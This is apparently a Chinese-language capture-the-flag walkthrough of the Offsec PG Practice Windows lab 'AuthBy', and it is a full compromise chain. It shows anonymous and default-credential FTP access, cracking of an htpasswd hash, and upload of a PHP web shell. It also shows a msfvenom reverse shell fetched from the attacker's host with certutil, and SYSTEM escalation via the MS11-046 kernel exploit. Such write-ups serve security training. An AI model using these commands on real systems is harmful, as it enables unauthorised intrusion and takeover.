###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# AuthBy
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.190.46 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.190.46:21
Open 192.168.190.46:242
Open 192.168.190.46:3145
Open 192.168.190.46:3389

PORT     STATE SERVICE            REASON  VERSION
21/tcp   open  ftp                syn-ack zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Apr 23 10:34 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Mar 23 13:28 accounts
242/tcp  open  http               syn-ack Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
3145/tcp open  zftp-admin         syn-ack zFTPServer admin
3389/tcp open  ssl/ms-wbt-server? syn-ack
```

ftp登入，可以看到另外有`offsec`跟`admin`的帳號，可以試試看能不能利用`admin/admin`登入
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.190.46

Name (192.168.190.46:kali): Anonymous
331 User name received, need password.
Password:

ftp> cd accounts
ftp> dir
229 Entering Extended Passive Mode (|||2052|)
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Mar 23 13:28 backup
----------   1 root     root          764 Mar 23 13:28 acc[Offsec].uac
----------   1 root     root         1032 Apr 23 10:41 acc[anonymous].uac
----------   1 root     root          926 Mar 23 13:28 acc[admin].uac
```

利用`admin/admin`可以登入，把東西都下載下來
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.190.46

Name (192.168.190.46:kali): admin
331 User name received, need password.
Password: admin

ftp> get .htpasswd
ftp> get .htaccess
ftp> get index.php

## .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

## .htaccess
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>

## index.php
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>
```

用`john`破出密碼之後可以登入`http://192.168.190.46:242`，用`offsec/elite`登入
```
┌──(kali㉿kali)-[~/pgplay]
└─$ john htpasswd --wordlist=/home/kali/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)
```

可利用ftp上傳shell.php，確認可使用之後，下載reverse
```
ftp> put s.php

http://192.168.190.46:242/s.php?cmd=whoami
livda\apache

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80

┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.193 lport=80 -f exe > met_80.exe

192.168.190.46:242/s.php?cmd=certutil.exe -f -urlcache -split http://192.168.45.193:22/met_80.exe c:/windows/temp/met_80.exe

192.168.190.46:242/s.php?cmd=c:/windows/temp/met_80.exe
```

成功執行後在`C:\Users\apache\Desktop`可得local.txt
```
C:\Users\apache\Desktop>type local.txt
dd73515fb4d098e2d3cd57a50ea9ca64
```

查看`systeminfo`，查google可以查到[edb-40564](https://www.exploit-db.com/exploits/40564)，用[windows-kernel-exploits
/MS11-046/ms11-046.exe](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046)
```
C:\Users\Public\Documents>systeminfo
systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
...


C:\Users\Public\Documents>certutil.exe -urlcache -f http://192.168.45.193:242/ms11-046.exe ms11-046.exe

C:\Users\Public\Documents>ms11-046.exe

c:\Windows\System32>whoami

nt authority\system
```

在`C:\Users\Administrator\Desktop`得proof.txt
```
C:\Users\Administrator\Desktop>type proof.txt
34b6191868575b560e586fa39eefd951
```